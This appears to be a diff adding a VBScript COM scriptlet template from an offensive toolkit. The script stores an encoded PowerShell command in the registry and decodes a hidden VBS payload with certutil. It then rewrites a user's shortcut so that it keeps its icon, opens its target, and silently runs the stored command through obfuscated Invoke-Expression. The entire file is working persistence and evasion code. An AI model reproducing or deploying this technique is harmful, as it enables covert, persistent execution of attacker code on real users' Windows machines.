@@ -1,0 +1,37 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration progid="[RANDOM]" classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+	<script language="VbScript">
+		<![CDATA[
+			Set WshShell = CreateObject("WScript.Shell")
+			Set fso = CreateObject("Scripting.FileSystemObject")
+			
+			reg_key = "HKCU\Software\Microsoft\Windows\CurrentVersion\debug\Test"
+			reg_value = "aQBuAHYAbwBrAGUALQBpAHQAZQBtACAAJABlAG4AdgA6AHQAZQBtAHAAXABiAGEAdABzAGkAZwBuAGEAbAAuAHYAYgBzAAoA"
+			WshShell.RegWrite reg_key, reg_value, "REG_SZ"
+			
+			WshShell.Run "cmd /c echo [BATSIGNAL] > %TEMP%\batsignal", 0, True
+			WshShell.Run  "cmd /c certutil -decode %TEMP%\batsignal %TEMP%\batsignal.vbs", 0, True
+			WshShell.Run "cmd /c attrib +h +s %TEMP%\batsignal.vbs", 0, True
+			
+			mtarget = ";$k=(gp HKCU:\Software\Microsoft\Windows\CurrentVersion\debug -Name Test).Test;$c=$(powershell -enc $k);I`E`X '$c'"
+			
+			lnkFilename = "[LNKNAME]"
+			targetFilepath = "[TARGET]" 
+
+			if fso.FileExists(lnkFilename) Then
+			   WshShell.Run "cmd /c del " & lnkFilename, 0, True
+			End If
+			
+			Set lnk = WshShell.CreateShortcut(lnkFilename)
+			
+			lnk.TargetPath = "C:\Windows\System32\WindowsPowershell\v1.0\powershell.e"+"xe"
+			lnk.Arguments = " -nologo -c " & Chr(34) & "invoke-item "& Chr(92) & Chr(34) & targetFilepath & Chr(92) & Chr(34) & mtarget & Chr(34)
+         lnk.IconLocation = targetFilepath
+         lnk.WindowStyle = 7
+         lnk.Save
+         Set lnk = Nothing
+	
+		]]></script>
+</registration>
+</scriptlet>
